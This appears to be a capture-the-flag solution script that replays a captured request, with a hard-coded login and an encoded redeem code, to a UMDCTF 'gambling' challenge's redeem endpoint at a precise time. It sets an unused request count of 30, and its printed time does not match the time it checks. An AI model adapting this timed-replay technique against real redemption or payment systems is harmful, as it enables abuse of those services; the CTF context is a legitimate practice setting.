import requests
import time
from datetime import datetime

URL = "https://gambling.challs.umdctf.io/redeem"
headers = {
    "accept": "*/*",
    "accept-language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
    "authorization": "{\"username\":\"aaaabbbc\",\"password\":\"aaaabbbc\"}",
    "content-type": "application/json",
    "priority": "u=1, i",
    "sec-ch-ua": "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"macOS\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin"
}

body = "\"eW91IHRoaW5rIHlvdSdyZSBzcGVjaWFsIGJlY2F1c2UgeW91IGtub3cgaG93IHRvIGRlY29kZSBiYXNlNjQ/\""

NUM_REQUESTS = 30

def send_request():
    try:
        response = requests.post(
            URL,
            headers=headers,
            data=body
        )
        print(response.text)
    except Exception as e:
        print(f"Error: {e}")

def wait_until_target_time():
    while True:
        now = datetime.now()
        if now.hour == 0 and now.minute == 14 and now.second == 0:
            print("00:10:00! Sending request...")
            send_request()
            break
        time.sleep(0.02)  # 20ms마다 체크 (0.02초)

wait_until_target_time()

